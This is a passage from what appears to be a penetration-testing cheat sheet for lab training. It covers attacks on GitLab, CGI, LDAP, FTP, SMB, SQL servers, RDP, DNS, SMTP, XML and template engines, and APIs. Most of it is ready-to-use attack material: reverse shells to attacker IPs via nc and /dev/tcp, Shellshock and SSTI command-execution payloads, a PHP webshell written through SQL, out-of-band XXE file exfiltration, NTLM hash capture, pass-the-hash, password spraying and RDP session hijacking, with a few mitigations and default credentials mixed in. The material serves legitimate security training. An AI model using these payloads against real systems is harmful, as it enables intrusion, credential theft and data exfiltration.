##### Registration (`/users/sign_up`)

- Attempt to register an account.
- Enumerate valid usernames and email addresses:
  - Existing email: "Email has already been taken"
  - Existing username: "Username has already been taken"

##### Internal Projects

Once logged in, check `/explore` for internal projects. Review source code for sensitive information.

##### Search Functionality

Search for passwords, API keys, usernames.

##### Groups and Snippets

Explore "groups" and "snippets" sections.

#### Attacking GitLab

##### Username Enumeration

```bash
# Bash script version
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

# Python script version
python3 gitlab_userenum.py -u http://gitlab.inlanefreight.local:8081/ -l users.txt
```

##### Password Spraying

GitLab's default account lockout policy: **10 failed attempts** trigger a **10-minute lockout**. Use slow, distributed attacks.

##### Authenticated Remote Code Execution (RCE)

GitLab Community Edition **≤13.10.2** is vulnerable to RCE due to improper handling of **ExifTool metadata**.

```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'
nc -lnvp 8443
```

---

## 5. Common Gateway Interfaces (CGI)

### Shellshock

#### Vulnerability Overview

**CVE-2014-6271 - Shellshock**: A critical vulnerability in Bash that allows arbitrary command execution through manipulated environment variables. Bash versions up to **4.3** improperly handle function definitions in environment variables. Can lead to **remote code execution** in the context of the web server user, often via CGI scripts.

#### Enumeration

##### Discover CGI Scripts (Gobuster)

```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

##### Verify CGI Script Accessibility (cURL)

```bash
curl -i http://10.129.204.231/cgi-bin/access.cgi
```

#### Exploitation

##### Confirm Vulnerability (cURL)

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' http://10.129.204.231/cgi-bin/access.cgi
```

##### Execute a Reverse Shell (cURL)

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
sudo nc -lvnp 7777
```

---

## 6. Miscellaneous Applications

### IIS Tilde Enumeration

#### Concept

IIS generates **8.3 short file names** for files and directories, accessible using the **tilde (~)** character in URLs. The 8.3 format: 8 characters, a period, and a 3-character extension (e.g., `SecretDocuments` becomes `SECRET~1`). Affected Versions: IIS 5.0 through 8.5.

#### Enumeration Commands and Tools

##### Nmap Port and Service Scan

```bash
nmap -p- -sV -sC --open <target_ip>
```

##### IIS ShortName Scanner (Java)

```bash
java -jar iis_shortname_scanner.jar 0 5 http://<target_ip>/
```

- `0` : Start position. `5` : Maximum length of short file name.

##### Wordlist Generation (egrep and sed)

```bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

##### Gobuster Directory Bruteforcing

```bash
gobuster dir -u http://<target_ip>/ -w /tmp/list.txt -x .aspx,.asp
```

#### Sample Enumeration Output

```
200 OK - /SECRET~1
200 OK - /DOCUME~1/FILE.TXT
403 Forbidden - /ADMIN~1
```

#### Mitigation

```powershell
fsutil behavior set disable8dot3 1
```

---

### Attacking LDAP

#### LDAP Fundamentals

- **Ports:** 389 (LDAP - unencrypted), 636 (LDAPS - LDAP over SSL/TLS)
- **Data Model:** Hierarchical, tree-like structure (Directory Information Tree - DIT). Entries organized using Distinguished Names (DNs).

#### LDAP Requests

`bind` (authenticate), `unbind` (close), `search` (query), `add`, `delete`, `modify`, `compare`.

#### LDAP Injection Vulnerability

Special Characters: `*` (wildcard), `( )` (grouping), `|` (OR), `&` (AND), `!` (negation), `>=` `<=`, `\` (escape).

Example Attack: If a login form uses `(&(uid=$username)(userPassword=$password))`, enter `*)(uid=*` as username to bypass authentication.

Additional payloads:

```
*)(|(cn=*)(mail=*))     # Extracting all users
admin*)(|(objectClass=*))  # Privilege escalation
```

#### LDAP Enumeration Techniques

```bash
nmap -p 389,636 -sV -sC <target_ip>
```

##### ldapsearch

```bash
# Anonymous Bind - List all objects
ldapsearch -x -h <target_ip> -p 389 -b "<base_dn>" "(objectClass=*)"

# Authenticated Bind - List all objects
ldapsearch -x -h <target_ip> -p 389 -D "<bind_dn>" -w "<password>" -b "<base_dn>" "(objectClass=*)"
```

##### enum4linux (for Windows environments)

```bash
enum4linux -a <target_ip>
```

LDAP Browser Tools: JXplorer, Apache Directory Studio, LdapAdmin. Additional: LDAPenum, Medusa.

---

### Web Mass Assignment Vulnerabilities

#### Concept

Mass assignment vulnerabilities occur when frameworks allow direct insertion of user-supplied data into objects or databases without proper restrictions. Attackers modify HTTP request parameters to alter unauthorized model attributes, leading to: unauthorized data modification, privilege escalation, bypassing approval mechanisms.

#### Exploitation Examples

##### Python/SQLite Exploit (HTTP POST request modification)

```http
POST /register HTTP/1.1
Host: <target_host>
Content-Type: application/x-www-form-urlencoded
Content-Length: ...

username=newuser&password=password123&confirmed=anyvalue
```

An attacker can register a user and set `confirmed` to any value, bypassing admin approval.

##### Ruby on Rails (Vulnerable)

```ruby
class UsersController < ApplicationController
  def create
    @user = User.new(params[:user]) # Vulnerable mass assignment
    if @user.save
      redirect_to @user
    else
      render 'new'
    end
  end
end
```

Attacker sends HTTP request with `admin=true`, escalating privileges.

##### Rails Prevention (Strong Parameters)

```ruby
private
def user_params
  params.require(:user).permit(:username, :email) # Only allow specific fields
end
```

##### Laravel (PHP) Vulnerable

```php
class User extends Model {
    protected $guarded = []; // Allows mass assignment of all attributes (unsafe)
}
```

##### Laravel Prevention

```php
class User extends Model {
    protected $fillable = ['username', 'email']; // Only specific fields are allowed
}
```

##### Express (Node.js) Vulnerable

```javascript
app.post('/register', async (req, res) => {
    const user = await User.create(req.body); // Accepts all fields from request (unsafe)
    res.send(user);
});
```

##### Express Prevention

```javascript
app.post('/register', async (req, res) => {
    const user = await User.create({
        username: req.body.username,
        email: req.body.email
    }); // Only specific fields are allowed
    res.send(user);
});
```

#### Prevention Techniques

- **Whitelisting:** Define explicitly allowed attributes.
- **ORM Security Features:** Rails strong parameters, Sequelize `allowNull`/`defaultValue`.
- **Sanitization & Validation:** Validate user inputs before database insertion.
- **Database Constraints:** Use `NOT NULL`, `CHECK`, and `ENUM` values.

---

## 7. Attacking Common Services

### FTP

#### FTP Basics

- **Port:** TCP/21
- **Attack Vectors:** Misconfigurations (anonymous access, excessive privileges), exploiting known vulnerabilities.

#### Enumeration

```bash
nmap -sC -sV -p 21 <target_IP>
```

#### Manual FTP Connection

```bash
ftp <target_IP>
nc <target_IP> 21
```

#### Anonymous Login

```bash
ftp <target_IP>
# Username: anonymous
# Password: (Press Enter)
```

#### Brute-Force (Medusa)

```bash
medusa -u <username> -P <password_list> -h <target_IP> -M ftp
```

#### FTP Bounce Attack (Nmap)

```bash
nmap -Pn -v -n -p <target_port> -b anonymous:password@<ftp_server_IP> <internal_target_IP>
```

#### CoreFTP Arbitrary File Write (CVE-2022-22836)

```bash
curl -k -X PUT -H "Host: <target_IP>" --basic -u <username>:<password> --data-binary "Payload" --path-as-is https://<target_IP>/../../../../../../<filename>
```

#### FTP Client Commands (Post-Login)

```bash
ls                     # List directory contents
cd <directory>         # Change directory
get <filename>         # Download a single file
mget <filename1> <filename2> # Download multiple files
put <local_filename>   # Upload a single file
mput <local_filename1> <local_filename2> # Upload multiple files
help                   # Show help for FTP commands
```

---

### SMB

#### SMB Basics

- **Ports:** TCP/139, UDP/137-138 (NetBIOS), TCP/445 (Direct over TCP/IP)
- **Samba:** Unix/Linux implementation of SMB.

#### Enumeration

```bash
nmap -sV -sC -p 139,445 <target_IP>
```

#### Misconfigurations - Null Sessions

```bash
smbclient -N -L //<target_IP>         # List available shares
smbmap -H <target_IP>                 # List shares with permissions
rpcclient -U '%' <target_IP>          # RPC enumeration
enum4linux-ng.py -A -C <target_IP>    # Comprehensive SMB enumeration
```

#### Brute-Forcing/Password Spraying

```bash
crackmapexec smb <target_IP> -u <user_list> -p <password> --local-auth
```

#### Remote Code Execution (RCE)

```bash
impacket-psexec <user>:<password>@<target_IP>
crackmapexec smb <target_IP> -u <user> -p <password> -x 'whoami' --exec-method smbexec
```

#### Enumerate Logged-on Users

```bash
crackmapexec smb <target_IP> -u <user> -p <password> --loggedon-users
```

#### Extract Hashes from SAM Database

```bash
crackmapexec smb <target_IP> -u <user> -p <password> --sam
```

#### Pass-the-Hash (PtH)

```bash
crackmapexec smb <target_IP> -u <user> -H <hash>
```

#### Forced Authentication Attacks (Responder)

```bash
responder -I <interface>     # Start Responder to capture NetNTLM hashes
hashcat -m 5600 <hash_file> <wordlist>
```

#### CVE-2020-0796 (SMBGhost)

Compression mechanism flaw in SMBv3.1.1 allowing RCE by unauthenticated attacker. Affected: Windows 10 1903, 1909.

---

### SQL Databases

#### Ports

- MSSQL: TCP/1433, UDP/1434, TCP/2433 (hidden)
- MySQL: TCP/3306

#### Enumeration

```bash
nmap -Pn -sV -sC -p1433 <target_IP>  # MSSQL
```

#### Connecting to SQL Servers

```bash
mysql -u <user> -p<password> -h <host>                         # MySQL
sqlcmd -S <server> -U <user> -P <password>                      # MSSQL
sqsh -S <server> -U <user> -P <password>                        # MSSQL (Linux)
mssqlclient.py -p 1433 <user>@<host>                            # MSSQL (Impacket)
```

#### SQL Syntax

```sql
SHOW DATABASES;                                                # MySQL
SELECT name FROM master.dbo.sysdatabases; GO                   # MSSQL
USE <database>;
SHOW TABLES;                                                   # MySQL
SELECT table_name FROM <database>.INFORMATION_SCHEMA.TABLES; GO # MSSQL
SELECT * FROM <table>;
```

#### Command Execution (MSSQL)

```sql
xp_cmdshell 'command'; GO
```

##### Enable xp_cmdshell

```sql
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; GO
```

#### MySQL (User-Defined Functions - UDFs) / Write Local Files

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/path/webshell.php';  # MySQL
```

#### Read Local Files

```sql
SELECT * FROM OPENROWSET(BULK N'file_path', SINGLE_CLOB) AS Contents; GO  # MSSQL
SELECT LOAD_FILE('/path/file');                                            # MySQL
```

#### Capture MSSQL Service Hash

```sql
EXEC master..xp_dirtree '\\<attacker_IP>\share\'; GO
```

Use Responder or Impacket's smbserver to capture the hash:

```bash
responder -I <interface>
impacket-smbserver share ./ -smb2support
```

#### Impersonate Users (MSSQL)

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; GO
EXECUTE AS LOGIN = '<user>';
REVERT;
```

#### Communicate with Linked Servers (MSSQL)

```sql
SELECT srvname, isremote FROM sysservers; GO
EXECUTE('query') AT [<linked_server>]; GO
```

---

### RDP

#### RDP Basics

- **Port:** TCP/3389

#### Enumeration

```bash
nmap -Pn -p3389 <target_IP>
```

#### Password Spraying

```bash
crowbar -b rdp -s <target_IP>/32 -U <user_list> -c <password>
hydra -L <user_list> -p <password> <target_IP> rdp
```

#### RDP Login

```bash
rdesktop -u <user> -p <password> <target_IP>
xfreerdp /v:<target_IP> /u:<user> /p:<password>
```

#### RDP Session Hijacking

```bash
query user
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <target_session_ID> /dest:rdp-tcp#<our_session_ID>"
net start sessionhijack
```

#### RDP Pass-the-Hash (PtH)

Enable Restricted Admin Mode (registry key):

```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Authenticate using NT Hash:

```bash
xfreerdp /v:<target_IP> /u:<user> /pth:<NT_hash>
```

#### CVE-2019-0708 (BlueKeep)

RCE vulnerability, Use-After-Free (UAF) technique, triggered by manipulated initialization requests. Impacts older Windows versions. Exploitation can cause system instability (BSoD).

---

### DNS

#### DNS Basics

- **Ports:** UDP/53 (default), TCP/53 (zone transfers and large packets)

#### Enumeration

```bash
nmap -p53 -Pn -sV -sC <target_IP>
```

#### DNS Zone Transfers

```bash
dig AXFR @<nameserver> <domain>
fierce --domain <domain>
```

#### Domain/Subdomain Takeovers

##### Subdomain Enumeration Tools

```bash
./subfinder -d <domain> -v
# Sublist3r can be used similarly.
git clone https://github.com/TheRook/subbrute.git
cd subbrute
echo "<nameserver>" > ./resolvers.txt
./subbrute <domain> -s ./names.txt -r ./resolvers.txt
```

##### CNAME Record Enumeration

```bash
host <subdomain>
nslookup <subdomain>
```

##### Subdomain Takeover Verification

- Check for "NoSuchBucket" errors (AWS S3).
- Use can-i-take-over-xyz repository.

#### DNS Spoofing/Cache Poisoning

```bash
# Ettercap Setup:
# 1. Edit /etc/ettercap/etter.dns and add spoofed domain/IP.
# 2. Start Ettercap, scan hosts.
# 3. Add target IP to Target1, gateway IP to Target2.
# 4. Enable dns_spoof plugin.
# Bettercap can also be used for similar purposes.
```

---

### SMTP

#### Email Basics

- **SMTP:** TCP/25 (unencrypted), TCP/465 (encrypted), TCP/587 (encrypted/STARTTLS)
- **POP3:** TCP/110 (unencrypted), TCP/995 (encrypted)
- **IMAP4:** TCP/143 (unencrypted), TCP/993 (encrypted)

#### Enumeration

##### MX Records

```bash
host -t MX <domain>
dig mx <domain>
```

##### A Records

```bash
host -t A <mail_server>
dig A <mail_server>
```

##### SPF, DKIM, and DMARC Records

```bash
dig txt <domain>
```

##### Nmap

```bash
nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <target_IP>
```

#### SMTP User Enumeration

```bash
telnet <target_IP> 25
VRFY <username>
EXPN <mailing_list>
RCPT TO <username>
```

```bash
smtp-user-enum -M VRFY -U <user_list> -D <domain> -t <target_IP>
```

#### POP3 User Enumeration

```bash
telnet <target_IP> 110
USER <username>
PASS <password>
```

#### Cloud Enumeration

##### Office 365

```bash
python3 o365spray.py --validate --domain <domain>
python3 o365spray.py --enum -U <user_list> --domain <domain>
```

##### Google Workspace

```bash
python3 enum_google.py --domain <domain>
```

#### Password Attacks

```bash
hydra -L <user_list> -P <password_list> <target_IP> <service>
```

##### Office 365

```bash
python3 o365spray.py --spray -U <user_list> -p <password> --count 1 --lockout 1 --domain <domain>
```

##### MailSniper (Office 365)

```powershell
Invoke-Spray -Usernames <user_list> -Password <password> -OutFile results.txt
```

#### Open Relay

```bash
nmap -p25 -Pn --script smtp-open-relay <target_IP>
swaks --from <sender> --to <recipient> --header 'Subject: <subject>' --body <body> --server <target_IP>
```

#### SMTP Spoofing (Manual Test)

```bash
telnet <target_IP> 25
HELO example.com
MAIL FROM:<spoofed@domain.com>
RCPT TO:<victim@domain.com>
DATA
Subject: Test
This is a spoofing test.
.
QUIT
```

#### Latest Email Service Vulnerabilities

- **CVE-2020-7247 (OpenSMTPD):** RCE vulnerability, affects OpenSMTPD up to 6.6.2, no authentication required.
- **CVE-2021-27211 (Exim):** Improper validation of recipient address, can lead to RCE.

#### Additional Tools

Amass (passive DNS), Shodan (exposed mail servers), TheHarvester (email addresses), Censys (reconnaissance).

---

## 8. Web Attacks

### HTTP Verb Tampering

#### Identifying Protected Pages

```bash
curl -i http://target.com/admin/reset.php
curl -i http://target.com/admin/
```

#### Identifying Allowed HTTP Methods

```bash
curl -i -X OPTIONS http://target.com/admin/reset.php
```

```bash
nc -nv target.com 80
OPTIONS / HTTP/1.1
Host: target.com
```

#### Exploiting Authentication Bypass

##### Using HEAD Method for Bypass

```bash
curl -i -X HEAD http://target.com/admin/reset.php
```

- Manually change HTTP method in Burp Suite.

##### Bypassing Security Filters by Changing HTTP Method

Modify requests from `POST` to `GET` or `HEAD`.

##### Testing Command Injection After Bypass

```bash
curl -X GET "http://target.com/page?filename=file1; touch file2;"
```

#### Insecure Web Server Configurations

##### Vulnerable Apache Configuration

```xml
<Limit GET>
    Require valid-user
</Limit>
```

Can be bypassed using `HEAD` or `OPTIONS` methods.

##### Vulnerable Tomcat Configuration

```xml
<http-method>GET</http-method>
```

##### Vulnerable ASP.NET Configuration

```xml
<allow verbs="GET" roles="admin">
```

#### Testing for SQL Injection with SQLmap

```bash
sqlmap -u "http://target.com/page?code=test" --dbs # Enumerate databases
sqlmap -u "http://target.com/page?code=test" --dump # Dump database content
sqlmap -u "http://target.com/page?code=test" --os-shell # Get OS shell
```

#### Fuzzing HTTP Methods

```bash
wfuzz -c -z file,verbs.txt http://target.com/admin/FUZZ
```

#### Example of Insecure Coding (PHP)

```php
if(preg_match($pattern, $_POST["code"])) {
    $query = "SELECT * FROM ports WHERE port_code LIKE '%" . $_REQUEST["code"] . "%'";
}
```

Filters `$_POST` but uses `$_REQUEST`, allowing SQL injection via `GET` requests.

#### Common HTTP Verbs

- **HEAD**: Retrieves headers only.
- **PUT**: Replaces a resource.
- **DELETE**: Removes a resource.
- **OPTIONS**: Lists allowed methods.
- **PATCH**: Partially modifies a resource.

---

### Insecure Direct Object References (IDOR)

#### Definition

IDOR vulnerabilities occur when an application exposes direct references to internal objects (e.g., files, database records) that users can manipulate to access unauthorized data. Causes: weak/missing server-side access controls, relying on client-side restrictions, insecure API endpoints.

#### Identifying IDOR Vulnerabilities

##### Manual URL Parameter Manipulation

```bash
curl "http://target.com/documents.php?uid=2"
curl "http://target.com/documents.php?uid=3"
```

##### Mass Enumeration (Using curl & grep)

```bash
curl -s "http://target.com/documents.php?uid=3" | grep -oP "/documents.*?.pdf"
```

##### Automated Mass IDOR Testing (Bash Script)

```bash
#!/bin/bash
url="http://target.com"
for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "/documents.*?.pdf"); do
        wget -q "$url$link"
    done
done
```

```bash
bash ./your_script_name.sh
```

#### Bypassing Encoded References

##### Base64 Decode

```bash
echo "MTIzNDU=" | base64 -d
```

##### Hex Decode

```bash
echo "3132333435" | xxd -r -p
```

##### MD5 Reverse Lookup

```bash
echo -n "1" | md5sum | awk '{print $1}'
```

##### JWT Tampering (Testing for Missing Signature Verification)

```bash
jwt_tool "<JWT_TOKEN>" -d -S none
```

#### IDOR in APIs

##### Insecure GET Requests

```bash
curl "http://target.com/profile/api.php/profile/2"
```

##### Insecure PUT Requests

```bash
curl -X PUT -H "Content-Type: application/json" -d '{"uid": 2, "full_name": "New Name"}' "http://target.com/profile/api.php/profile/2"
```

##### Insecure DELETE Requests

```bash
curl -X DELETE "http://target.com/profile/api.php/profile/11"
```

#### IDOR in Mobile Apps

Use **MobSF** and **Frida**:

```bash
frida -U -n target_app -e "Interceptor.attach(Module.findExportByName(null, 'sendRequest'), {
    onEnter: function(args) {
        console.log('Request:', Memory.readUtf8String(args[1]));
    }
});"
```

#### Tools for IDOR Exploitation

```bash
# SQLMap (For IDOR + SQL Injection)
sqlmap -u "http://target.com/page?id=1" --dbs

# wfuzz (Fuzzing Parameters)
wfuzz -c -z range,1-100 http://target.com/page?id=FUZZ

# ffuf (Fast Fuzzing for APIs & Directories)
ffuf -w wordlist.txt -u http://target.com/api/user/ -X GET -H "Authorization: Bearer TOKEN"

# Arjun (Automated Parameter Discovery)
python3 arjun.py -u "http://target.com/api/profile"
```

Burp Suite (Intruder, Repeater, Comparer), ZAP Fuzzer, Netcat for manual HTTP requests.

---

### XML External Entity (XXE) Injection

#### Introduction

XXE vulnerabilities occur when a web application parses XML input from a user without proper sanitization. Impact: sensitive file disclosure, SSRF, DoS, RCE.

#### Local File Disclosure

```xml
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>' http://target.com/vulnerable.php
```

#### Source Code Disclosure (PHP Filter)

```xml
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<root>&xxe;</root>
```

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]><root>&xxe;</root>' http://target.com/vulnerable.php
```

#### Remote Code Execution (RCE) with Expect

```xml
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<root>&xxe;</root>
```

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "expect://id"> ]><root>&xxe;</root>' http://target.com/vulnerable.php
```

#### CDATA Exfiltration via External DTD

Create `xxe.dtd`:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Host the DTD file:

```bash
python3 -m http.server 8000
```

Send the XML payload:

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % begin "<![CDATA["> <!ENTITY % file SYSTEM "file:///var/www/html/file.txt"> <!ENTITY % end "]]>"> <!ENTITY % xxe SYSTEM "http://your-ip:8000/xxe.dtd"> %xxe; ]><root>&joined;</root>' http://target.com/vulnerable.php
```

#### Error-Based XXE with External DTD

Create `xxe.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

```bash
python3 -m http.server 8000
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://your-ip:8000/xxe.dtd"> %remote; %error; ]>' http://target.com/vulnerable.php
```

#### Out-of-Band (OOB) Exfiltration with External DTD

Create `xxe.dtd`:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://your-ip:8000/?content=%file;'>">
```

```bash
php -S 0.0.0.0:8000
```

Send the XML payload:

```xml
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://your-ip:8000/xxe.dtd"> %remote; %oob; ]><root>&content;</root>
```

#### Automated XXE Exploitation with XXEinjector

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

Create `request.txt`:

```
POST /vulnerable.php HTTP/1.1
...headers...
<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

```bash
ruby XXEinjector.rb --host=your-ip --httpport=8000 --file=request.txt --path=/etc/passwd --oob=http --phpfilter
nc -lvp 8000
tcpdump -i tun0 port 53
```

#### XXE Prevention

1. Disable DTDs in XML parsers.
2. Input validation/sanitization.
3. Use safe parsing libraries.
4. Update components.
5. Least privilege.
6. WAF.

---

## 9. Server-Side Attacks

### Server-Side Request Forgery (SSRF)

#### Common Protocols

- `http://127.0.0.1/file:///etc/passwd` → Access local files
- `gopher://dateserver.htb:80/...` → Send arbitrary requests
- `dict://127.0.0.1:11211/info` → Query dictionary services
- `ftp://127.0.0.1:21` → Access FTP servers
- `file://` → Access local files
- `php://` → PHP stream wrappers (highly dangerous)
- `data://` → Data encoding
- `https://` → Accessing internal HTTPS servers

#### Advanced SSRF Bypass Techniques

- **URL Encoding**: `http://127.0.0.1%3A80`
- **Double Encoding**: `http://127.0.0.1%253A80`
- **Alternative IP Representations**:
  - Octal: `http://0177.0.0.1`
  - Hexadecimal: `http://0x7F.0x00.0x00.0x01`
  - IPv6 Abuse: `http://[::1]:80`
- **DNS Rebinding**: Change IP resolutions dynamically.
- **Varying Ports**: Bypass filters using different ports.

### Server-Side Template Injection (SSTI)

#### Identifying SSTI

Test String: `{{<%[%'"}}\.` → Identify templating engine.

#### Exploiting SSTI by Templating Engine

##### Jinja2 (Python)

```jinja
{{config.items()[4][1].__class__.__init__.__globals__['os'].popen('id').read()}}
```

##### Twig (PHP)

```twig
{{system('id')}}
```

##### Freemarker (Java)

```java
${new java.lang.ProcessBuilder("id").start()}
```

##### Velocity (Java)

```velocity
#set($e="e")#set($x=$e.class.forName("java.lang.Runtime").getRuntime().exec("id"))$x
```

##### Smarty (PHP)

```smarty
{${system('id')}}
```

##### Handlebars (JavaScript)

```handlebars
{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')()}}
```

#### Blind SSTI

Timing-based detection:

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Out-of-Band SSTI Detection (Burp Collaborator, external DNS services).

### Server-Side Includes (SSI) Injection

#### SSI Directives

- Print environment variables: `<!--#echo var="HTTP_USER_AGENT" -->`
- Execute commands: `<!--#exec cmd="id" -->`
- Include files: `<!--#include file="/etc/passwd" -->`
- Modify error messages: `<!--#config errmsg="Hacked!" -->`

### XSLT Injection

#### Common XSLT Elements

`<xsl:template>`, `<xsl:value-of>`, `<xsl:for-each>`, `<xsl:if>`.

#### XSLT Injection Payloads

##### Information Disclosure

```xml
<xsl:value-of select="system-property('xsl:version')" />
```

##### Local File Inclusion (LFI)

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

##### Remote Code Execution (RCE)

```xml
<xsl:value-of select="php:function('system','id')" />
```

#### Advanced XSLT Exploits

- **XXE via XSLT**: `document('http://attacker.com/payload.xml')`
- **Network SSRF via XSLT**: Fetching internal/external resources.

---

## 10. Web Service & API Attacks

### XML-RPC Attacks

#### Manual Request Crafting (curl)

```bash
curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>examples.getStateName</methodName><params><param><value><i4>41</i4></value></param></params></methodCall>' http://target.com/RPC2
```

#### Fuzzing with wfuzz

```bash
wfuzz -z file,xmlrpc_methods.txt -d '<?xml version="1.0"?><methodCall><methodName>FUZZ</methodName><params><param><value><i4>1</i4></value></param></params></methodCall>' http://target.com/RPC2
```

### JSON-RPC Attacks

#### Manual Request Crafting (curl)

```bash
curl -X POST -H "Content-Type: application/json-rpc" -d '{"method": "sum", "params": {"a": 3, "b": 4}, "id": 0}' http://target.com/ENDPOINT
```

#### Fuzzing with wfuzz

```bash
wfuzz -z file,jsonrpc_methods.txt -d '{"method": "FUZZ", "params": {}, "id": 0}' http://target.com/ENDPOINT
```

### SOAP Attacks

#### Manual Request Crafting (curl)

```bash
curl -X POST -H "Content-Type: text/xml;charset=UTF-8" -d '<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"><SOAP-ENV:Body><m:GetQuotation xmlns:m="http://www.xyz.org/quotations"><m:QuotationsName>Microsoft</m:QuotationsName></m:GetQuotation></SOAP-ENV:Body></SOAP-ENV:Envelope>' http://target.com/Quotation
```

### RESTful API Attacks

#### Basic HTTP Requests (curl)

```bash
curl -X GET http://target.com/api/users
curl -X POST -H "Content-Type: application/json" -d '{"username": "test", "password": "password"}' http://target.com/api/login
curl -X PUT -H "Content-Type: application/json" -d '{"admin": true}' http://target.com/api/users/1
curl -X DELETE http://target.com/api/users/1
```

#### Fuzzing with wfuzz

```bash
wfuzz -z file,api_endpoints.txt http://target.com/api/FUZZ
```

#### SSRF Tests (curl)

```bash
curl "http://target.com/api/proxy?url=http://169.254.169.254/"
```

#### XXE Tests (curl)

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>' http://target.com/api/xml
```

#### JWT Attacks (using jwt_tool)

```bash
jwt_tool <JWT> -C
```

#### API Rate Limiting Bypass (using ffuf)

```bash
ffuf -u http://target.com/api/login -X POST -d '{"username": "test", "password": "password"}' -H "Content-Type: application/json" -H "X-Forwarded-For: FUZZ" -w wordlists/ip_list.txt
```

### General Web Service/API Tools

```bash
# Nmap
nmap -sV -sC target.com
nmap -p 80,443,8080 target.com

# Nikto
nikto -h target.com
nikto -h target.com -p 8080

# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -k

# SQLmap
sqlmap -u "http://target.com/api/endpoint?id=1" --dbs
sqlmap -u "http://target.com/api/endpoint?id=1" --dump

# Postman (CLI automation via Newman)
newman run collection.json

# OWASP ZAP
zap-cli active-scan -t target.com

# Wsdump.pl (WSDL analysis)
wsdump.pl -o output.txt http://target.com/service?wsdl
```

Burp Suite (Intruder, Repeater, Scanner), Postman (API testing).

---

## Quick Reference: Key CVEs

| CVE | Application | Description |
|-----|-------------|-------------|
| CVE-2014-6271 | Bash/CGI | Shellshock - RCE via environment variables |
| CVE-2014-3704 | Drupal | Drupalgeddon - SQL injection to create admin |
| CVE-2017-8917 | Joomla | SQL Injection |
| CVE-2017-12617 | Tomcat | Arbitrary JSP Upload via HTTP PUT |
| CVE-2018-7600 | Drupal | Drupalgeddon2 - Unauthenticated RCE |
| CVE-2018-7602 | Drupal | Drupalgeddon3 - RCE via Form API (authenticated) |
| CVE-2018-9276 | PRTG | Authenticated command injection |
| CVE-2019-0708 | RDP | BlueKeep - RCE |
| CVE-2019-10945 | Joomla | Directory traversal and file deletion |
| CVE-2020-0796 | SMB | SMBGhost - RCE via SMBv3.1.1 compression |
| CVE-2020-1938 | Tomcat | Ghostcat - AJP LFI |
| CVE-2020-24881 | osTicket | SSRF in v1.14.1 |
| CVE-2020-7247 | OpenSMTPD | RCE, no authentication required |
| CVE-2021-27211 | Exim | RCE via recipient address validation |
| CVE-2022-22836 | CoreFTP | Authenticated directory traversal, arbitrary file write |
| CVE-2023-23752 | Joomla | Unauthenticated admin takeover via REST API |

---

## Quick Reference: Default Credentials

| Application | Credentials |
|-------------|-------------|
| Tomcat | tomcat:tomcat, admin:admin, tomcat:password, role1:role1 |
| Splunk | admin:changeme |
| PRTG | prtgadmin:prtgadmin |

---

